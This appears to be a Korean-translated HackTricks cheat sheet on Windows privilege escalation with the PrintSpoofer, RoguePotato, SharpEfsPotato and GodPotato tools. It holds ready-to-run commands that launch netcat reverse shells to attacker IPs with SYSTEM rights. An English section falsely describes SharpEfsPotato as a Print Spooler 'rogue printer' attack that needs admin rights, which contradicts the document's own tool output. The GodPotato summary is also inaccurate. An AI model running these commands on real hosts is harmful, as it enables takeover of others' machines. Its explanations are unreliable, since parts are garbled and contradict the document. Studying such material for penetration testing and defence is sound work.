# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

{% hint style="warning" %}
**JuicyPotato는** Windows Server 2019 및 Windows 10 빌드 1809 이후에서는 작동하지 않습니다. 그러나 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)를 사용하여 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM` 수준의 액세스를 얻을 수 있습니다**. 이 [블로그 포스트](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)는 JuicyPotato가 더 이상 작동하지 않는 Windows 10 및 Server 2019 호스트에서 위임 권한을 남용하는 데 사용할 수 있는 `PrintSpoofer` 도구에 대해 자세히 설명합니다.
{% endhint %}

## 빠른 데모

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### 로그포테이토 (RoguePotato)

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that exploits the EFS (Encrypting File System) service to achieve local privilege escalation on Windows systems. It leverages the "Rogue Potato" technique, which takes advantage of the Windows Print Spooler service to execute arbitrary code with SYSTEM privileges.

#### Usage

To use SharpEfsPotato, follow these steps:

1. Download the tool from the [GitHub repository](https://github.com/itm4n/SharpEfsPotato).
2. Compile the source code using Visual Studio or use a pre-compiled binary.
3. Execute the tool with the following command:

```plaintext
SharpEfsPotato.exe
```

#### How it Works

SharpEfsPotato works by creating a rogue printer that triggers the Print Spooler service to execute a DLL file with SYSTEM privileges. This DLL file is responsible for launching a new process with elevated privileges, effectively escalating the user's privileges.

#### Limitations

It's important to note that SharpEfsPotato requires administrative privileges to create the rogue printer and execute the attack. Additionally, the target system must have the Print Spooler service enabled.

#### Mitigation

To mitigate the risk of SharpEfsPotato and similar attacks, consider the following measures:

- Disable the Print Spooler service if it's not needed.
- Regularly apply security updates to the operating system.
- Implement the principle of least privilege to limit the impact of potential privilege escalation attacks.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato는 RoguePotato와 PrintSpoofer를 결합한 공격 기법입니다. 이 기법은 Windows 시스템에서 로컬 권한 상승을 수행하는 데 사용됩니다.

RoguePotato는 COM 객체를 이용하여 Windows 시스템에서 NT AUTHORITY\SYSTEM 권한을 얻는 데 사용됩니다. 이를 위해 원격 프로시저 호출(RPC)을 사용하여 COM 객체를 호출하고, 이를 통해 SYSTEM 권한을 얻습니다.

PrintSpoofer는 Windows 시스템에서 프린터 스풀러 서비스의 취약점을 이용하여 SYSTEM 권한을 얻는 데 사용됩니다. 이를 위해 PrintSpoofer 도구를 사용하여 프린터 스풀러 서비스의 취약점을 악용하고, SYSTEM 권한을 획득합니다.

GodPotato는 이 두 가지 기법을 결합하여 더 강력한 로컬 권한 상승 공격을 수행합니다. 이를 통해 공격자는 시스템에서 최고 권한인 NT AUTHORITY\SYSTEM 권한을 얻을 수 있습니다.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## 참고 자료
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
